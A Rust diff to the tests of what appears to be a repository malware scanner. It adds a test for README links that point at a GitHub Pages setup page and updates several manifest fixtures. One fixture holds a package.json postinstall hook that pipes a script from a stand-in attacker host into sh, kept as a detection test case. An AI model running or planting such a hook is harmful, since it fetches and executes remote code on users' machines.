@@ -8,6 +8,7 @@ pub mod protection;
 pub mod rules;
 pub mod scoring;
 pub mod shell;
+mod web;
 
 pub use cluster::{evaluate_clusters, ClusterCandidate, ClusterResult};
 pub use fingerprint::{simhash_distance, ReadmeTraits};
@@ -105,7 +106,7 @@ mod tests {
     fn loads_external_rules_directory() {
         let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../../rules");
         let eng = SecurityEngine::from_rules_dir(&dir).expect("external rules/ must load");
-        assert_eq!(eng.rule_version(), 4);
+        assert_eq!(eng.rule_version(), 5);
         assert_eq!(eng.ruleset_hash().len(), 16);
     }
 
@@ -234,6 +235,42 @@ mod tests {
     }
 
     #[test]
+    fn identifies_setup_links_to_the_repository_pages_entry_point() {
+        let eng = engine();
+        let check = |text: &str, repo: &str| {
+            eng.extract_traits(Some(text), Some("Example"), Some(repo)).pages_landing_candidate
+        };
+        let image_button = "### PowerShell Setup Button\n\n[![](files/button.png)](https://Example.github.io/demo/)";
+        assert!(check(image_button, "demo"));
+        let report = eng.analyze_readme(
+            Some(image_button),
+            Some(&RepoMeta { owner: Some("Example".into()), name: Some("demo".into()), ..Default::default() }),
+            ScanOptions::default(),
+        );
+        assert!(report.traits.pages_landing_candidate);
+        assert!(!report.traits.lure);
+        assert_eq!(report.verdict, "clean");
+
+        assert!(check("- [Install][go]\n\n[go]: https://example.github.io/demo/index.html", "demo"));
+        assert!(check("### Download\n\n<a class='action' href='https://example.github.io/demo/'><img src='button.svg'></a>", "demo"));
+        assert!(check("[Download](https://example.github.io/)", "example.github.io"));
+        for other in [
+            "[Docs](https://example.github.io/demo/)",
+            "[Install](https://other.github.io/demo/)",
+            "[Install](https://example.github.io/)",
+            "[Install](https://example.github.io/demonstration/)",
+            "[Install](https://example.github.io/demo/guide/)",
+            "[Install](https://example.github.io//demo/)",
+            "[Setup](https://example.github.io:8080/demo/)",
+            "### Download\n\n<a data-href='https://example.github.io/demo/' href='/manual'>Docs</a>",
+            "```md\n[Download](https://example.github.io/demo/)\n```",
+            "### Install\n\nInstructions.\n\n### Reference\n\n[Docs](https://example.github.io/demo/)",
+        ] {
+            assert!(!check(other, "demo"), "{other}");
+        }
+    }
+
+    #[test]
     fn exercises_all_lazy_regexes_without_panic() {
         let eng = engine();
         let samples = [
@@ -261,7 +298,7 @@ mod tests {
                 path: "package.json".into(),
                 content: r#"{"name":"x","scripts":{"postinstall":"curl -s https://evil.cc/p.sh | sh"}}"#.into(),
             }],
-            tree: vec![],
+            ..Default::default()
         });
         assert_eq!(bad_pkg.verdict, "malicious");
 
@@ -270,16 +307,16 @@ mod tests {
                 path: "package.json".into(),
                 content: r#"{"name":"x","scripts":{"build":"vite build","test":"node --test"}}"#.into(),
             }],
-            tree: vec![],
+            ..Default::default()
         });
         assert_eq!(clean_pkg.verdict, "clean");
 
         let decoy = eng.analyze_manifest(&ManifestInput {
-            files: vec![],
             tree: vec![
                 TreeEntry { path: "README.md".into(), size: 500 },
                 TreeEntry { path: "Setup.exe".into(), size: 350_000 },
             ],
+            ..Default::default()
         });
         assert_eq!(decoy.verdict, "malicious");
     }
@@ -346,7 +383,7 @@ mod tests {
                 ManifestFile { path: ".vscode/tasks.json".into(), content: vscode_tasks },
                 ManifestFile { path: "setup.py".into(), content: big_setup },
             ],
-            tree: vec![],
+            ..Default::default()
         });
         assert_eq!(report.verdict, "malicious");
         assert!(report.signals.len() >= 2);
